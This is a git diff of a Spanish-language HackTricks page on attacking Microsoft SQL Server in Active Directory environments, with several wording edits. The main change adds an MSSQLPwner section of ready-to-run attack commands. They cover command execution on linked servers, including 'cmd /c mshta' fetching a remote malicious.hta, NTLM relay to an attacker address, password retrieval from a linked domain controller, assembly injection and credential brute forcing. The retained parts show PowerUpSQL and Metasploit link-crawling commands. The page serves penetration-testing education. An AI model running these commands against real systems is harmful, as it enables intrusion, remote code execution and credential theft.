@@ -10,7 +10,7 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 
 * Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
 * **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos de github.
 
 </details>
 {% endhint %}
@@ -20,6 +20,72 @@ Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" d
 {% embed url="https://websec.nl/" %}
 
 ## **Enumeración / Descubrimiento de MSSQL**
+
+### Python
+La herramienta [MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner) se basa en impacket, y también permite autenticarse usando tickets kerberos, y atacar a través de cadenas de enlace.
+
+<figure><img src="https://raw.githubusercontent.com/ScorpionesLabs/MSSqlPwner/main/assets/interractive.png"></figure>
+```shell
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+
+# Interactive mode with 2 depth level of impersonations
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth  -max-impersonation-depth 2 interactive
+
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth custom-asm hostname
+
+# Executing custom assembly on the current server with windows authentication and executing hostname command on the SRV01 linked server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 custom-asm hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec hostname
+
+# Executing the hostname command using stored procedures on the linked SRV01 server with sp_oacreate method
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 exec "cmd /c mshta http://192.168.45.250/malicious.hta" -command-execution-method sp_oacreate
+
+# Issuing NTLM relay attack on the SRV01 server
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250
+
+# Issuing NTLM relay attack on the local server with custom command
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
+
+# Executing direct query
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth direct-query "SELECT CURRENT_USER"
+
+# Retrieving password from the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 retrive-password
+
+# Execute code using custom assembly on the linked server DC01
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-server DC01 inject-custom-asm SqlInject.dll
+
+# Bruteforce using tickets, hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using hashes, and passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt -pl passwords.txt
+
+# Bruteforce using tickets against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -tl tickets.txt -ul users.txt
+
+# Bruteforce using passwords against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -pl passwords.txt
+
+# Bruteforce using hashes against the hosts listed on the hosts.txt
+mssqlpwner hosts.txt brute -ul users.txt -hl hashes.txt
+
+```
+### Enumerando desde la red sin sesión de dominio
+```
+# Interactive mode
+mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth interactive
+```
+---
+###  Powershell
 
 El módulo de powershell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) es muy útil en este caso.
 ```powershell
@@ -79,7 +145,7 @@ También podría ser posible **ejecutar comandos** dentro del host de MSSQL.
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
-Check in the page mentioned in the **siguiente sección cómo hacer esto manualmente.**
+Check in the page mentioned in the **siguiente sección cómo hacerlo manualmente.**
 
 ### MSSQL Trucos Básicos de Hacking
 
@@ -89,7 +155,7 @@ Check in the page mentioned in the **siguiente sección cómo hacer esto manualm
 
 ## Enlaces de Confianza de MSSQL
 
-Si una instancia de MSSQL es confiable (enlace de base de datos) por otra instancia de MSSQL. Si el usuario tiene privilegios sobre la base de datos confiable, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde puede ejecutar comandos.
+Si una instancia de MSSQL es confiable (enlace de base de datos) por una instancia de MSSQL diferente. Si el usuario tiene privilegios sobre la base de datos confiable, podrá **utilizar la relación de confianza para ejecutar consultas también en la otra instancia**. Estas confianzas pueden encadenarse y en algún momento el usuario podría encontrar alguna base de datos mal configurada donde puede ejecutar comandos.
 
 **Los enlaces entre bases de datos funcionan incluso a través de confianzas de bosque.**
 
@@ -127,7 +193,7 @@ Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql
 ```
 ### Metasploit
 
-Puedes verificar fácilmente los enlaces de confianza usando metasploit.
+Puedes verificar fácilmente los enlaces de confianza utilizando metasploit.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
@@ -152,7 +218,7 @@ EXEC sp_linkedservers;
 ```
 ![](<../../.gitbook/assets/image (716).png>)
 
-#### Ejecutar consultas en enlace confiable
+#### Ejecutar consultas en un enlace confiable
 
 Ejecutar consultas a través del enlace (ejemplo: encontrar más enlaces en la nueva instancia accesible):
 ```sql
